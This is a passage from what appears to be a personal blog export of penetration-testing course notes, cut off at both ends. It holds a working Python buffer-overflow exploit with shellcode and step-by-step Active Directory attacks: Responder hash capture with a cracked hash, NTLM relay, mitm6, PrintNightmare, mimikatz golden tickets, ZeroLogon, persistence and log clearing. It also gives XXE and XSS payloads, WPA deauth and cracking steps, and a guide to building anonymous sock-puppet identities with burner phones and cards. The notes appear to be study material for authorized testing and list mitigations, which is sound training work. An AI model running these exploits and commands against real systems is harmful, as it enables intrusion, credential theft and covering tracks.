\"\\x75\\xdb\\x35\\x78\\x47\\x14\\x48\\x79\\x80\\x49\\xa1\\x2b\\x59\\x05\\x14\" \"\\xdb\\xee\\x53\\xa5\\x50\\xbc\\x72\\xad\\x85\\x75\\x74\\x9c\\x18\\x0d\\x2f\" \"\\x3e\\x9b\\xc2\\x5b\\x77\\x83\\x07\\x61\\xc1\\x38\\xf3\\x1d\\xd0\\xe8\\xcd\" \"\\xde\\x7f\\xd5\\xe1\\x2c\\x81\\x12\\xc5\\xce\\xf4\\x6a\\x35\\x72\\x0f\\xa9\" \"\\x47\\xa8\\x9a\\x29\\xef\\x3b\\x3c\\x95\\x11\\xef\\xdb\\x5e\\x1d\\x44\\xaf\" \"\\x38\\x02\\x5b\\x7c\\x33\\x3e\\xd0\\x83\\x93\\xb6\\xa2\\xa7\\x37\\x92\\x71\" \"\\xc9\\x6e\\x7e\\xd7\\xf6\\x70\\x21\\x88\\x52\\xfb\\xcc\\xdd\\xee\\xa6\\x98\" \"\\x12\\xc3\\x58\\x59\\x3d\\x54\\x2b\\x6b\\xe2\\xce\\xa3\\xc7\\x6b\\xc9\\x34\" \"\\x27\\x46\\xad\\xaa\\xd6\\x69\\xce\\xe3\\x1c\\x3d\\x9e\\x9b\\xb5\\x3e\\x75\" \"\\x5b\\x39\\xeb\\xda\\x0b\\x95\\x44\\x9b\\xfb\\x55\\x35\\x73\\x11\\x5a\\x6a\" \"\\x63\\x1a\\xb0\\x03\\x0e\\xe1\\x53\\xec\\x67\\xe9\\xa8\\x84\\x75\\xe9\\xbf\" \"\\x08\\xf3\\x0f\\xd5\\xa0\\x55\\x98\\x42\\x58\\xfc\\x52\\xf2\\xa5\\x2a\\x1f\" \"\\x34\\x2d\\xd9\\xe0\\xfb\\xc6\\x94\\xf2\\x6c\\x27\\xe3\\xa8\\x3b\\x38\\xd9\" \"\\xc4\\xa0\\xab\\x86\\x14\\xae\\xd7\\x10\\x43\\xe7\\x26\\x69\\x01\\x15\\x10\" \"\\xc3\\x37\\xe4\\xc4\\x2c\\xf3\\x33\\x35\\xb2\\xfa\\xb6\\x01\\x90\\xec\\x0e\" \"\\x89\\x9c\\x58\\xdf\\xdc\\x4a\\x36\\x99\\xb6\\x3c\\xe0\\x73\\x64\\x97\\x64\" \"\\x05\\x46\\x28\\xf2\\x0a\\x83\\xde\\x1a\\xba\\x7a\\xa7\\x25\\x73\\xeb\\x2f\" \"\\x5e\\x69\\x8b\\xd0\\xb5\\x29\\xab\\x32\\x1f\\x44\\x44\\xeb\\xca\\xe5\\x09\" \"\\x0c\\x21\\x29\\x34\\x8f\\xc3\\xd2\\xc3\\x8f\\xa6\\xd7\\x88\\x17\\x5b\\xaa\" \"\\x81\\xfd\\x5b\\x19\\xa1\\xd7\")  padding = \"\\x90\" * 20  shellcode = offset + pointer + padding + overflow  try: \ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM) \ts.connect(('172.16.127.128',9999)) \ts.send(('TRUN /.:/' + shellcode)) \ts.close() except: \tprint \"Error connecting to server\" \tsys.exit()       set netcat and run the exploit we have root    Exploit Development Using Python3 and Mona   in immunity:  !mona config -set workingfolder c:\\mona !mona bytearray -cpb \"\\x00\\x0a\" !mona compare -f c:\\mona\\bytearray.bin -a &lt;ESP&gt;  !mona jmp -r ESP -m \"essfunc.dll\"  ESP 015919F8      A couple of changes using python3   example print(“”) with parenteses and payload should be encoded   every input should be byte encoded like b(“\\x00\\x01”)    #!/usr/bin/python3 import sys, socket  offset = b\"A\" * 2003 pointer = b\"\\xaf\\x11\\x50\\x62\" overflow = (b\"\\xb8\\x1e\\x4c\\x2e\\xcc\\xd9\\xc9\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\" b\"\\x52\\x31\\x47\\x12\\x03\\x47\\x12\\x83\\xd9\\x48\\xcc\\x39\\x19\\xb8\\x92\" b\"\\xc2\\xe1\\x39\\xf3\\x4b\\x04\\x08\\x33\\x2f\\x4d\\x3b\\x83\\x3b\\x03\\xb0\" b\"\\x68\\x69\\xb7\\x43\\x1c\\xa6\\xb8\\xe4\\xab\\x90\\xf7\\xf5\\x80\\xe1\\x96\" b\"\\x75\\xdb\\x35\\x78\\x47\\x14\\x48\\x79\\x80\\x49\\xa1\\x2b\\x59\\x05\\x14\" b\"\\xdb\\xee\\x53\\xa5\\x50\\xbc\\x72\\xad\\x85\\x75\\x74\\x9c\\x18\\x0d\\x2f\" b\"\\x3e\\x9b\\xc2\\x5b\\x77\\x83\\x07\\x61\\xc1\\x38\\xf3\\x1d\\xd0\\xe8\\xcd\" b\"\\xde\\x7f\\xd5\\xe1\\x2c\\x81\\x12\\xc5\\xce\\xf4\\x6a\\x35\\x72\\x0f\\xa9\" b\"\\x47\\xa8\\x9a\\x29\\xef\\x3b\\x3c\\x95\\x11\\xef\\xdb\\x5e\\x1d\\x44\\xaf\" b\"\\x38\\x02\\x5b\\x7c\\x33\\x3e\\xd0\\x83\\x93\\xb6\\xa2\\xa7\\x37\\x92\\x71\" b\"\\xc9\\x6e\\x7e\\xd7\\xf6\\x70\\x21\\x88\\x52\\xfb\\xcc\\xdd\\xee\\xa6\\x98\" b\"\\x12\\xc3\\x58\\x59\\x3d\\x54\\x2b\\x6b\\xe2\\xce\\xa3\\xc7\\x6b\\xc9\\x34\" b\"\\x27\\x46\\xad\\xaa\\xd6\\x69\\xce\\xe3\\x1c\\x3d\\x9e\\x9b\\xb5\\x3e\\x75\" b\"\\x5b\\x39\\xeb\\xda\\x0b\\x95\\x44\\x9b\\xfb\\x55\\x35\\x73\\x11\\x5a\\x6a\" b\"\\x63\\x1a\\xb0\\x03\\x0e\\xe1\\x53\\xec\\x67\\xe9\\xa8\\x84\\x75\\xe9\\xbf\" b\"\\x08\\xf3\\x0f\\xd5\\xa0\\x55\\x98\\x42\\x58\\xfc\\x52\\xf2\\xa5\\x2a\\x1f\" b\"\\x34\\x2d\\xd9\\xe0\\xfb\\xc6\\x94\\xf2\\x6c\\x27\\xe3\\xa8\\x3b\\x38\\xd9\" b\"\\xc4\\xa0\\xab\\x86\\x14\\xae\\xd7\\x10\\x43\\xe7\\x26\\x69\\x01\\x15\\x10\" b\"\\xc3\\x37\\xe4\\xc4\\x2c\\xf3\\x33\\x35\\xb2\\xfa\\xb6\\x01\\x90\\xec\\x0e\" b\"\\x89\\x9c\\x58\\xdf\\xdc\\x4a\\x36\\x99\\xb6\\x3c\\xe0\\x73\\x64\\x97\\x64\" b\"\\x05\\x46\\x28\\xf2\\x0a\\x83\\xde\\x1a\\xba\\x7a\\xa7\\x25\\x73\\xeb\\x2f\" b\"\\x5e\\x69\\x8b\\xd0\\xb5\\x29\\xab\\x32\\x1f\\x44\\x44\\xeb\\xca\\xe5\\x09\" b\"\\x0c\\x21\\x29\\x34\\x8f\\xc3\\xd2\\xc3\\x8f\\xa6\\xd7\\x88\\x17\\x5b\\xaa\" b\"\\x81\\xfd\\x5b\\x19\\xa1\\xd7\")  padding = b\"\\x90\" * 20  shellcode = offset + pointer + padding + overflow  try:   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   s.connect(('172.16.127.128',9999))   payload = b\"TRUN /.:/\" + shellcode  # we could use payload.encode, but sometimes the payload does not work # thats why we are byte encoding manually every input    s.send((payload))   s.close() except:   print(\"Error connecting to server\")   sys.exit()    AD   Authenticates using Kerberos tickets:  non-Windows devices, such as Linux machines, firewalls, etc.  Can also authenticate to AD via RADIUS or LDAP   Physical AD Components   Domain Controller  Host a copy of the AD DS directory store Provide authentication and authorization services Replicate updates to other domain controllers in the domain and forest Allow administrative access to manage user accounts and network resources   The AD DS data store  Consists of the Ntds.dit file Is stored by default in the %SystemRoot%\\NTDS folder on all domain controllers Is accessible only through the domain controller processes and protocols   Logical AD Components   AD DS Schema  Enforces rules regarding object creation and configuration   Domain  Used to group and manage objects in an organization   Trees  Hierarchy of domains in AD DS Share a contiguous namespace with the parent domain Can have additional child domains   Forest  Collection of one or more trees Share a common schema Share the enterprise Admins and Schema Admins groups   Organizational Units (Ous)  AD containers that contain users, groups, computers and others OUs Delegate permissions to administer groups of objects Represent your organization hierarchically and logically   Trusts  How we have access between resources: Directional = trust goes to trusted domain to a trusted domain Transitive = trust relationship is extended beyond a two-domain trust   Objects  whats inside OUs: user, group, computer, printers, contacts, shared folders, etc   Lab Overview and Requirements  1 Windows Server 2019 2 Windows 10 Enterprise  Requirements: 60 GB Disk Space 16 GB RAM   Links  https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-server-2019   Install AD DS on server setup the AD change the names of the computers   cmd with admin privileges  setspn -a SAIBOT-DC/SQLService.MK.local:60111 MK\\SQLService # -a = domain controller    Create a GPO in the forest domain, - disable windows defender  windows &gt; administrative &gt; Windows components &gt; Windows defender &gt; disable w defender set the enforced option in GPO &gt; Rule &gt; scope &gt; enforced = \"yes\" This will make sure that every machine in the domain, disable the windows defender      add both machines to the domain   log with administrator in both machines and   add one user to local admin in his machine and another with local admin in the 2 machines   create a file called share in C:\\ in both machines   Attacking AD: Initial Attack Vectors   LLMNR - Poisoning  Used to identify hosts when DNS fails to do so.   Step 1:  Run Responder python Responder.py -I tun0 -rdw   Step 2:  An Event Occurs...  Step 3:  Get Dem Hashes  Step 4:  Crack Dem Hashes: hashcat -m 5600 hash.txt rockyou.txt   SMB Relay  Instead of cracking hashes, we can relay those hashes to specific machines and potentially gain access   SMB signing must be disabled on the target   Step 1:  \tRun Responder -&gt; nano responder.conf \tdisable SMB and HTTP -&gt; cause we are going to be listening but not responding back   Step 2:  python Responder.py -I tun0 -rdw   Step 3:  Set up your relay: python ntlmrelayx.py -tf target.txt -smb2support   Step 4:  An Event occours...   Step 5:  Win!   IPv6 Attacks Overview  We are gonna set a DNS to the Ipv6 because they generally do not have one.   So I will get information and set NTLM with MITM6 to create an account in DC Step 1:  download MITM6 &gt; https://github.com/dirkjanm/mitm6.git  Step 2:  In the server &gt; manage &gt;  add roles and features &gt; active directory certificate services &gt; cert authority      Take a look at PassBack attack - look at printers, sometimes we can redirect the networking in the config   page of the printer to our kali machine and set up a netcat or a responder to get the password/access   LLMNR   IPS:  server = 172.16.127.129 ermac-pc1 = 172.16.127.128 subzero-pc2 = 172.16.127.130   Responder  responder -I eth0 -rdw  # tips is to run this tool early in the morning # any machine in the AD who access our attacker IP # the responder is gonna capture their hashes   Go crack with hashcat  hashcat -m 5600 hash rockyou.txt # -m 5600 = NetNTLMv2  ERMAC::MK:c1a71fa9c4173965:a53bb1b11fd1444e7ec42216ec49a04f:01010000000000008011f80f19c9d70150783cc36d9aafd40000000002000800410038005200360001001e00570049004e002d004a0056005800470054004c004200510049004f00540004003400570049004e002d004a0056005800470054004c004200510049004f0054002e0041003800520036002e004c004f00430041004c000300140041003800520036002e004c004f00430041004c000500140041003800520036002e004c004f00430041004c00070008008011f80f19c9d7010600040002000000080030003000000000000000010000000020000054c8bbe07c882c5bd501dc943c19e4c47c1ba84a9556cd1beb5930ca01be55b30a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e0030002e00310031000000000000000000:'Password1'   Mitigation - LLMNR - NBT-NS  Disable LLMNR and NBT-NS Require Network Access Control Require strong user passwords &gt;14 characters + the more complex harder to attacker to break it   SMB Relay   Discovering Hosts with SMB Signing Disabled  nmap --script=smb2-security-mode.nse -p 445 &lt;ip&gt;/24 # 'Message signing enabled but not required' - This is what we need to perform this attack  /etc/responder/Responder.conf # turnoff SMB and HTTP   Attack walkthrough:  responder -I eth0 -rdw python ntlmrelayx.py -tf target.txt -smb2support  # connect to our attack IP # Get the SAM hashes = it would be like shadow in linux   With interactive shell:  responder -I eth0 -rdw python ntlmrelayx.py -tf target.txt -smb2support -i # trigger the event connecting in our kali IP # Get the port of smb client shell in ntlmrelayx tab  nc 127.0.0.1 &lt;port&gt; # we got a smb shell # help to show options  # in ntmlrelayx # -e = execute some program, msfvenom \\for example # -c = command, \"whoami\", \"dir\", \"reverse shell whatever\" etc    Mitigation - SMB Relay  # Enable SMB signing on all devices # Disable NTLM authentication on network # Account tiering - limits domain admin to specifc tasks # Local admin restriction    Gaining Shell Access   Metasploit  search psexec   use exploit - t/windows/smb/psexec   or exploit/windows/smb/psexec_psh   psexec.py  psexec.py &lt;domain/user:password@target ip&gt; # example: psexec.py mk.local/subzero:Password3@172.16.127.130      We can try use smbexec.py or wmiexec.py with the same syntax    IPv6 DNS Takeover via MITM6  mitm6 -d mk.local # -d &lt;domain&gt;    ntlmrelayx -6 -t ldaps://172.16.127.129 -wh fakewpad.mk.local -l lootme # ip = DC # -l = loot - to dump information  Mitigation  - If you do not use IPv6 the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via GPO. - If WPAD is not in use, disable via GPO and disable the WinHttpAutoProxySrc service - Enable both LDAP signing and LDAP channel binding - Consider Administrative users to the Protected Users group or marking them as Account is sensitive and can not be delegated, which will prevent any impersonation of that user via delegation.   Attacking AD Strategies and Other vectors   Strategies:  - Begin the day with 'mitm6' or 'Responder' - Runs scans to generate traffic - If scans are taking too long, look for websites in scope (http_version) - Look for default credentials on web logins &gt; printers, jenkins, etc - Think outside the box   PowerView CheatSheet  →  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993   PowerView  Run PowerView:  powershell -ep bypass # -ep = ExecutionPolicy # . .\\PowerView.ps1  Commands: Get-NetDomain Get-NetDomainController Get-DomainPolicy (Get-DomainPolicy).\"system access\" Get-NetUser Get-NetUser | select cn / samaccountname / description / etc Get-UserProperty Get-UserProperty -Properties pwdlastset / logonaccount / badpwdcount Get-NetComputer Get-NetComputer -FullData | select OperatingSystem Get-NetGroup -GroupName *admin* Get-NetGroupMember -GroupName \"Domain Admins\" Invoke-ShareFinder Get-NetGPO | select displayname, whenchanged   BloodHound  set neo4j open bloodhound Get a data collector to use Invoke-BloodHound  →  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1   → https://github.com/BloodHoundAD/SharpHound3   Pass the data collector to the Windows Machine:  powershell -ep bypass &gt; . .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName file.zip Send the file: \\Downloads\\file.zip to Kali   Go to BloodHound in Kali:  Upload Data &gt; the zip file that we generate in the Windows Machine Enumeration time!   Post-Compromise Attacks   Additional Resources      https://adsecurity.org/   http://blog.harmj0y.net/   https://www.pentesteracademy.com/activedirectorylab   Pass the Password &amp; Pass the Hash  crackmapexec smb &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;pass&gt; crackmapexec smb &lt;ip/CIDR&gt; -u &lt;user&gt; -d &lt;domain&gt; -H &lt;hash&gt; --local-auth # obs: Regarding the SAM hash, we always gonna get the second portion to pass/crack etc # --sam =try to dump the sam      [To remember] You can pass around NTLM hashes, you can not pass NTLMv2 hashes    Pass with psexec:  psexec.py &lt;\"user\":@ip&gt; -hashes &lt;the whole hash&gt;   Get hashes:  secretsdump.py &lt;domain/user:password@target ip&gt;   Mitigation - Pass Attacks  - Avoid re-using local admin password - Limit who is a local administrator (least privilege) - Utilize strong passwords - Privileges Access Management (PAM) - Automatically rotate passwords    Token Impersonation  Temporary Keys that allow you access to a system   2 types:  Delegate: Created \\for logging into a machine or RDP. Impersonate: non-interactive such as attaching a network driver or a domain login script   In meterpreter:  getuid load incognito list_tokens -u impersonate_token &lt;domain\\\\user&gt; shell      We can use psexec.py in meterpreter to get the first access, then we can post-attack the token    rev2self = to comeback to the last access in meterpreter   Mitigation - Token Impersonation  - Limit user/group token creation permissions - Account tiering - Local admin restriction   Kerberoasting   Overview:  - The user request the TGT from DC by sending his NTLM hash - The DC answer with the TGT with kerberoasting hash - When user wanna access any server, the user request the TGS from DC by sending the TGT - The DC answer with the TGS with the servers account hash  Finally: The user can access the service by sending the TGS THe service will answer if thats valid or not   Attack with impacket:  python GetUserSPNs.py &lt;domain/user:password&gt; -dc-ip &lt;ip of DC&gt; -request  # Get the TGS hash # crack it: hashcat -m 13100 hash.txt rockyou.txt   Mitigation - Keberroasting  - Strong passwords - Least privilege   Group Policy Preferences (GPP) AKA MS14-025   To check if the vulnerabilty exists:  msf &gt; auxiliary/smb_enum_gpp   tips  in smb:  prompt off recurse on mget *  in Wserver2012&lt; -Found Groups.xml Get the cpassword gpp-decrypt &lt;cpassword&gt;   URL File Attacks      name it with ‘@something.url’   and place it in a share folder, or whatever place to people to click and redirect to our machine   so we can grab with responder   [InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\\\\&lt;kali ip&gt;\\%USERNAME%.icon IconIndex=1  # Getting Hash responder -I eth0 -v      you dont even need to open the file, just go to the directory of the file and we have access from responder    PrintNightmare (CVE-2021-1675)  https://github.com/cube0x0/CVE-2021-1675 https://github.com/calebstewart/CVE-2021-1675   To test if its vulnerable:  run rpcdump.py @&lt;dc ip&gt; | egrep 'MS-RPRN|MSPAR'      Install the last version of impacket   grab the code and save in somethin.py   The Attack  Step 1:  set mfvenom -o shell.dll   Step 5:  set msfconsole   Step 3:  smbserver.py share 'pwd' -smb2support   Step 4:  Example: ./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt; '\\\\&lt;kali ip&gt;\\share\\shell.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@&lt;dc ip&gt;  'C:\\shell.dll'   Mitigation  - Disable Spooler service   Mimikatz  - Tools used to view and steal credentials, generate kerberos tickets and leverage attacks - dumps credentials stored in memory - just a few attacks: - credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket   → https://github.com/gentilkiwi/mimikatz   Run in the DC:  mimikatz.exe privilege::debug sekurlsa::logonpasswords lsadump::sam /patch lsadump::lsa /patch = lsa (local security authority) # ntds.dit = contains all the credentials aswell   Golden ticket  mimikatz.exe privilege::debug lsadump::lsa /inject /name:krbtgt  # in the output: # grab the SID of the domain # grab the NTLM hash of the TGT account  kerberos::golden /User:Administrator /domain:mk.local /sid:&lt;SID&gt; /krbtgt:&lt;NTLM hash&gt; /id:500 /ptt # ptt = pass the ticket  misc::cmd = to get a shell      after that we can psexec.exe and dominate all the DC network    ZeroLogon (CVE-2020-1472)   → https://github.com/dirkjanm/CVE-2020-1472   → https://github.com/SecuraBV/CVE-2020-1472   Checker  python3 zerologon_check.py &lt;domain controller&gt; &lt;target ip&gt;   If it shows -&gt; Success DC can be fully compromised by a ZeroLogon      we can print and show to the client, without the need to execute the exploit.  Cause sets the credentials of DC to NULL, so we need to restore after, not worth the risk    Attack  python3 cve-2020-1472-exploit.py &lt;domain controller&gt; &lt;target ip&gt; secretsdump.py -just-dc &lt;domain/DC\\$@IP&gt;   Restore  secretsdump.py administrator@&lt;target ip&gt; -hash &lt;administrator full hash&gt; found the plain_password_hex &gt; copy the hash that is in front python3 restorepassword.py &lt;domain/DC@DC&gt; -target-ip &lt;ip&gt; -hexpass &lt;paste the hash of plain_pwd_hex&gt;   Post Exploitation   File Transfer Review   Certutil:  certutil.exe -urlcache -f http://&lt;ip&gt;/file.txt output_file.txt   HTTP:  python3 -m http.server python -m SimpleHTTPServer   Browser:  Navigate directly to file   FTP:  python -m pyftpdlib 21 &lt;kali ip&gt; ftp &lt;kali ip&gt;   Linux:  wget http://&lt;ip&gt;:&lt;port&gt;/file   Metasploit:  - Has download and upload features to transfer files   Maintaining Access   With Metasploit  Persistence Scripts:  run persistence -h exploit/windows/local/persistence exploit/windows/local/registry_persistence   Scheduled Tasks:  run scheduleme run schtaskabuse   Add a User:  net user hacker password123 /add   Pivoting  Lab setup:  - Shutdown the w10 machines - go to virtual network editor em vmware - change settings &gt; add network &gt; set up a range like 10.10.10.0/24 - edit virtual machine settings &gt; add a network adapter &gt; put the new network in the second adapter - in the 2nd w10 machine &gt; just change the net adapter to the new network      [RECAP] One machine will have dual net adapter       The second one gonna stay just in the new network - 10.10.10.0       Both w10 machines will ping each other, our kali should ping just one    Metasploit  exploit/windows/smb/psexec # enter in the machine that has 2 net adapters route print or ipconfig # to show the network config arp -a # to show the established connections run autoroute -s 10.10.10.0/24 run autoroute -p # to list all active routes background  # we can search portscan &gt; tcp or whatever   Cleanup  Make the system/network as it was when you entered it:  - remove executables, scripts and added files - remove malware, rootkits and added user accounts - set settings back to original configurations      Make it look like you were never there clear logs, traces etc    Web Application   To install GO and other useful tools:   https://github.com/Dewalt-arch/pimpmykali    Web Application Enumeration   Assetfinder  To install:  # go get -u github.com/tomnomnom/assetfinder  assetfinder &lt;domain&gt; assetfinder --subs-only &lt;domain&gt;      This script will sort only the subdomains that contains our target    create run.sh:   #!/bin/bash  url=$1  if [ ! -d \"$url\" ]; then   mkdir $url fi  if [ ! -d \"$url/recon\" ]; then   mkdir $url/recon fi  echo \"[+] Harvesting subdomains with assetfinder...\" assetfinder $url &gt;&gt; $url/recon/assets.txt cat $url/recon/assets.txt | grep $1 &gt;&gt; $url/recon/final.txt rm $url/recon/assets.txt    Amass  https://github.com/OWASP/Amass  # go get -v github.com/OWASP/Amass/v3/...  amass enum -d &lt;domain&gt;   Add to the script:  echo \"[+] Harvesting subdomains with Amass...\" amass enum -d $url &gt;&gt; $url/recon/f.txt sort -u $url/recon/f.txt &gt;&gt; $url/recon/final.txt rm $url/recon/f.txt   Httprobe  → https://github.com/tomnomnom/httprobe   It tests the list to see which one is up:  # go get -u github.com/tomnomnom/httprobe  cat &lt;file of subdomains&gt; | httprobe -s -p https:443   add to the script:  echo \"[+] Probing for alive domains...\" cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\\?:\\/\\////' | tr -d ':443' &gt;&gt; $url/recon/alive.txt   GoWitness  → https://github.com/sensepost/gowitness   Takes screenshot of a webpage:  # go get -u gorm.io/gorm = dependencies # go get -u github.com/sensepost/gowitness # gowitness single https://&lt;domain&gt;  cd screenshots/   tcm full script for subdomain enumeration  https://pastebin.com/MhE6zXVt   Additional Resources  https://www.youtube.com/watch?v=uKWu6yhnhbQ https://www.youtube.com/watch?v=MIujSpuDtFY&amp;list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA   Testing OWASP Top 10   https://owasp.org/Top10/      checklist: https://github.com/tanprathan/OWASP-Testing-Checklist   Juice Shop  its a vulnerable website made by owasp:  https://github.com/juice-shop/juice-shop https://pwning.owasp-juice.shop/   We can install locally with docker or just access the thm room:  https://tryhackme.com/room/owaspjuiceshop   Install Foxy Proxy  # extension in firefox to change proxy easyly https://addons.mozilla.org/pt-BR/firefox/addon/foxyproxy-standard/   BurpSuite  proxy &gt; options &gt; intercept client/server requests &gt; enable -- Is in targe scope      Everything else its not new. so i will pass for now, cause i used burp a lot in ctfs.    SQL Injection  Is an attack in which malicious SQL statements are injected into a SQL database   Overview  SQL Verbs:  SELECT, INSERT, DELETE, UPDATE, DROP, UNION  Common Terms:  WHERE, AND/OR/NOT, ORDER BY   Special Chars:  '  'and \" \" = string delimiters --, /*, # = comment delimiters *, % = wildcards ; = end sql statement =, +,&lt;,&gt; = logic   Mitigation  - Parameterized Statements: # Good example: \"SELECT * FROM users WHERE email =?\"; # Bad example: \"SELECT * FROM users WHERE email = '+email+'\";  - Sanitizing Input   Broken Authentication  Permits brute force or other automated attacks Permits default, weak or well-known passwords      look for token session   default credentials   possibility to brute force   Mitigation  - Implement MFA - Do not ship or deploy any default credentials - Implement weak-password checks   Sensitive Data Exposure  clear text data without criptography   Mitigation  - Make sure you data is encripted  - Dont share unnecessary data - Strong passords   Discover  # To discover files that not should have been exposed first of all we need a good enumeration # Find directories with web crawling: gobuster, dirb, dirsearch, ffuf, etc # Dig in responses of the requests in burp # Scan headers with: https://securityheaders.com/  nmap --script=ssl-enum-ciphers -p 443 &lt;domain&gt;   XML External Entities  Attack systems that parse XML imput   example.xml  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;   &lt;!DOCTYPE foo [   &lt;!ELEMENT foo any &gt;   &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;   Mitigation  - Disable the external entities in XML files   Broken Access Control  User get access to somewhere they should not example: access an admin panel without the credentials   - Bypass broken access in inspect element, delete hidden=\"\" - Change type: password to type: text to show passwords in clear text   Security Misconfiguration  Default credentials Improperly configured permissions Unnecessary features, ports, services, pages, accounts, etc   Mitigation  - Security Headers - ACLs - Do not have any unnecessary features, components, etc   Cross-Site Scripting (XSS)   Reflected:  after inserting something malicious, its gonna reflect back to us example &lt;script&gt; alert(0) &lt;/script&gt;   Stored:  The malicious code gets stored into the server   DOM:  Document object model - javascript its client side like reflected xss. example: &lt;iframe src=\"javascript:alert('xss')\"&gt;   Mitigation  - Encoding: '&lt;' becomes &amp;lt;  &lt;script&gt; becomes &amp;lt;script&gt; - Filtering: &lt;script&gt; becomes script - Validating: compare input against white list - Sanitization: combination of escaping, filtering and validation   Insecure Deserialization  We can send malicious data serialized and the application will deserialize and execute   Mitigation  - Monitoring deserialization - Enforcing strict type contraints during deserialization - Implement digital signatures    Using components with Known vulnerabilities  Using out-dated applications, unsupported or vulnerable   Mitigation  - Update old applications, services, etc - Keep inventory of versions of both client-side and server-side components - Remove unused dependencies, unnecessary features, components, files and documentation    Insufficient Logging and Monitoring  Auditable events, such as logins, failed logins uncler logs unable to detect or alert for active attacks in real time or near real time   Mitigation  - Ensure all login, access control failures and server-side input validation - Ensure that logs are generated in a format that can be easily consumed - Establish effective monitoring and alerting suspicious activities  - Establish an incident responde and recovery plan   Wireless Penetration Testing   Assessment of wireless network  WPA2 PSK (pre share key) WPA2 Enterprise   Activities performed  Evaluating strength of PSK Reviewing nearby networks Assessing guest networks Checking network access   Tools  Wireless card Router Laptop   Process of attack - WPA2 PSK  Place &gt; Discover &gt; Select &gt; Perform &gt; Capture &gt; Attemp  - Place wireless card into monitor mode - Discover information about network  \tchannel / BSSID (mac address)  - Select network and capture data - Perform deauth attack - Capture WPA handshake - Attemp to crack the handshake   WPA_PS2_Exploit   Connect the wireless card:  if you are using VM   Player &gt; removable devices &gt; card &gt; connect   iwconfig # to show wireless connections airmon-ng check kill # check and kill processes that will interfere in our scope airnon-ng start wlan0 # start monitor mode airodump-ng wlan0mon # to show possible targets in the area   BSSID # mac address of the access point PWR # power level, lower the number close we are to the device   airodump-ng -c &lt;channel&gt; --bssid &lt;mac address of target&gt; -w &lt;file name&gt; wlan0mon (our w_interface)      now we wait for the WPA handshake, we can accelerate this proccess by deauth the users from their network    aireplay-ng -0 (means deauth) 1 (number of times we are gonna run) -a &lt;mac address of target&gt; -c &lt;station mac address&gt; wlan0mon (our interface)      sometimes its necessary to run a couple of times, against differents users    After getting the WPA handshake:  ls capture* \tshow the .cap file   crack the handshake wpa:  aircrack-ng -w &lt;wordlist&gt; -b &lt;mac address of target&gt; &lt;the .cap file&gt; # we can try to crack with hashcat too   Report   Common Legal Documents   Sales:  Mutual Non-Disclosure Agreement (NDA) Master Service Agreement (MSA) Statement of Work (SOW) Other: Sample Report, Recommendation Letters, etc   Before you Test:  Rules of Engagement (ROE)   After you Test:  Findings Report   Pentest Report Writing   → https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report   → https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf   ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","recon","AD","web","bof"],
        "url": "/notes/pnpt/peh/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser2.jpg"
      },{
        "title": "2 - Open-Source Intelligence (OSINT)",
        "excerpt":"  → https://github.com/TCM-Course-Resources/Open-Source-Intellingence-Resources   OSINT is a multi-methods methodology for collecting, analyzing and making decisions about data accessible in publicy available sources to be used in an intellifence context.   Intelligence Lifecycle      Planning and Direction   Collection   Processing and Exploitation   Analysis and Production   Dissemination and Integration   Sock Puppets   The point of Sock puppet is to not draw attention to yourself. So, create fake accounts, fake credentials, fake identity. etc   Resources   Creating an Effective Sock Puppet for OSINT Investigations – Introduction:   https://jakecreps.com/sock-puppets/   The Art Of The Sock:   https://www.secjuice.com/the-art-of-the-sock-osint-humint/   Reddit - My process for setting up anonymous sockpuppet accounts:    https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/   Fake Name Generator:   https://www.fakenamegenerator.com/   This Person Does not Exist:    https://www.thispersondoesnotexist.com/   Privacy.com:   https://privacy.com/join/LADFC - *Referral link.  We each get $5 credit on sign up.   Creating Sock Puppet      Come up with a persona for the sockpuppet account   Use fake name generator  = ‘https://www.fakenamegenerator.com/’   Use This Person does not exist to create a image in AI = ‘https://www.thispersondoesnotexist.com/’   Get a burner phone, any brand that accept a mint mobile SIM card   Get a burner credit card from = https://privacy.com/   Set up amazon account.   Buy two Mint Mobile SIM cards   Send to an Amazon Pickup box, which can be anonymous   Get a VPN that u can set to the physical area the same as your sockpuppet   Set up the Mint Mobile trial account somewhere away from your home   Use the Mint Mobile to set up all websites u need   At least a google and protonmal account   After that, set up all the accounts with your trial mint SIM, set up 2FA on all accounts   After the 2FA, change the phone number to one you have more permanent access such as MySudo or Google Voice   Make sure everything works   Destroy the SIM card   Wipe the phone.   Search Engine Operators   Google - https://www.google.com/   Google Advanced Search - https://www.google.com/advanced_search   Google Search Guide - http://www.googleguide.com/print/adv_op_ref.pdf   Bing - https://www.bing.com/   Bing Search Guide - https://www.bruceclay.com/blog/bing-google-advanced-search-operators/   Yandex - https://yandex.com/   DuckDuckGo - https://duckduckgo.com/   DuckDuckGo Search Guide - https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/   Baidu - http://www.baidu.com/   Common Google Options = Same as using 